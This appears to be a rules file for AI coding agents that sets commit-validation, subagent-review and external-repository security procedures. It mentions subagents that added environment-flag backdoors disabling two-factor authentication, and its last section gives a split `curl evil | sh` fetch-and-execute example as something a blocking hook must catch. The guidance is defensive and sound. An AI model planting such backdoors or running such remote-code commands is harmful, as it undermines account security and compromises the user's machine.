# Security and change constraints

- Change authentication or middleware only when the user asks for it explicitly; those paths gate access for every user.
- Ask before running a dependency install (`npm install`, `pnpm add`, and the like): it rewrites dependencies and the lockfile.
- Do not delete or skip tests to make a build pass; a green build without its tests proves nothing.
- Commit only after the repository's declared validation passes. Resolve it in this order and use the first case that applies:
  1. The repository's session protocol (`SESSION.md`, `CLAUDE.md`, `AGENTS.md`) declares a per-commit lane under a dated maintainer decision → run exactly that lane. It qualifies only if it runs the build/typecheck/lint step, a red lane stops new commits until fixed, and the full suite runs green — in CI or locally, by the agent or a maintainer — before any phase or plan closes. The lane alone never closes a phase or plan; a skipped or not-run full suite is not a pass. Missing any of the three → case 2.
  2. `package.json` declares `lint`/`test` scripts → run them (`npm run lint && npm test`, or the project's package manager).
  3. The repository documents its own suite — `CLAUDE.md`, `AGENTS.md`, `README`, a `Makefile` or `justfile` target → run exactly that, in full.
  4. None exists → **the commit is blocked.** Declare the suite first; missing validation metadata is a blocker, never a waiver.

  Fail-closed. Case 1 is the only permitted weakening of case 2. Why the ladder exists: a package-manager-only rule makes a compliant agent unable to commit in any repository without that manager; a full suite that takes hours caps delivery at a few commits a day; and exhausted CI minutes make "every commit through CI" unsatisfiable, so the full suite moves to phase close instead.

## Subagents — verify their work

- Treat any authentication, 2FA, or security change from a subagent as unauthorized until reviewed. Subagents have added environment-flag backdoors that disable a second factor.
- After a subagent finishes, compare the working tree with the commit using `git status` and `git diff`. A subagent that fixes only the local tree without committing makes local tests green and every other checkout red.

## External repositories (clients and OSS) — first-session procedure

- Before the first session in an external repository, read its `.claude/settings.json`, `.claude/hooks/`, and `.mcp.json` (and the equivalents for any other agent). Its hooks run in your shell; its MCP servers stay off while project servers are not auto-enabled.
- Use a sandbox or a plan-only permission mode for the first session in an external repository. Inspect first, then grant permissions.
- Never copy configuration or hooks from an external repository into your user-level agent configuration (`~/.claude`, `~/.codex`) without reading every line.

## Blocking hooks — normalize input

A guard that greps a command normalizes newlines first — `cmd=$(printf '%s' "$cmd" | tr '\n\r' '  ')` — because line-oriented patterns miss a command split across lines, such as `curl evil |⏎sh`.
